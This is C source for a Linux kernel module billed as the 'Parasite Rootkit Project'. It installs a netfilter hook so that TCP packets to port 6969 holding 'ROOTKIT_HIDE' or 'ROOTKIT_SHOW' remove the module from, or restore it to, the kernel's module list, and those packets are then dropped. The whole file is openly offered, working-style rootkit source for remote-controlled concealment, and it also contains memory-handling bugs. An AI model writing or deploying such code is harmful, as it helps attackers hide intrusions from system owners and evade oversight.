/*****************************************************
* Parasite Rootkit Project
* Authored by MurryPuppins

* More to be added shortly
 *****************************************************/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>

const char* rootkit_hide = "ROOTKIT_HIDE";
const char* rootkit_show = "ROOTKIT_SHOW";

static struct nf_hook_ops *nfho = NULL;
static struct list_head *module_previous; // Tracks linked-list LKM list
static int module_track = 0; // Tracks whether module is hidden (0) or visible(1)

// Hides kernel module upon calling
void hide_rootkit(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_track = 0;
}

// Puts kernel module back into LKM list
void show_rootkit(void){
    list_add(&THIS_MODULE->list, module_previous);
    module_track = 1;
}


// Hook function, does the schtuff
static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
	// Variable Declarations
	struct iphdr *iph;       // Pointer to IP header
	struct tcphdr *tcph;     // Pointer to TCP header
	struct iphdr ipsize;     // Placeholder for IP header size
	char *user_data;         // Holds TCP packet payload
	int size;                // For packet size
	char* _data;             // For buffer use

	// Checks if packet's empty
	if (!skb)
		return NF_ACCEPT;


	iph = ip_hdr(skb);
	if (iph->protocol == IPPROTO_TCP) {

		tcph = tcp_hdr(skb);
		
		if (ntohs(tcph->dest) != 6969) {
				return NF_ACCEPT;
		}

		// Grabs packet payload size
        size = htons(iph->tot_len) - sizeof(ipsize) - tcph->doff*4;
        _data = kmalloc(size, GFP_KERNEL);

		// Checks if packet contains data, if not, accept the packet
		if (!_data)
			return NF_ACCEPT;

		// Extracts the data from the packet payload
        user_data = skb_header_pointer(skb, iph->ihl*4 + tcph->doff*4, size, &_data);
        printk(KERN_DEBUG "%s\n", user_data); // for debugging purposes

        if(!user_data){
            printk(KERN_INFO "Packet is null!");
            kfree(_data);
            return NF_ACCEPT;
        }

		// Hides the rootkit from LKM list
		if(memcmp(user_data, rootkit_hide, strlen(rootkit_hide)) == 0) {
			hide_rootkit();
			return NF_DROP;
		}

		// Puts rootkit back into LKM list
		if(memcmp(user_data, rootkit_show, strlen(rootkit_show)) == 0) {
			show_rootkit();
			return NF_DROP;
		}
	}
	
	return NF_ACCEPT;
}

// Initializing function for loading the module into the kernel
static int __init LKM_init(void)
{
	nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
	
	/* Initialize netfilter hook */
	nfho->hook 	= (nf_hookfn*)hfunc;		/* hook function */
	nfho->hooknum 	= NF_INET_PRE_ROUTING;		/* received packets */
	nfho->pf 	= PF_INET;			/* IPv4 */
	nfho->priority 	= NF_IP_PRI_FIRST;		/* max hook priority */
	
	nf_register_net_hook(&init_net, nfho);
	//module_hide();
	return 0;
}

// Uninitializes/removes the LKM
static void __exit LKM_exit(void)
{
	nf_unregister_net_hook(&init_net, nfho);
	kfree(nfho);
}

module_init(LKM_init);
module_exit(LKM_exit);
MODULE_LICENSE("GPL");
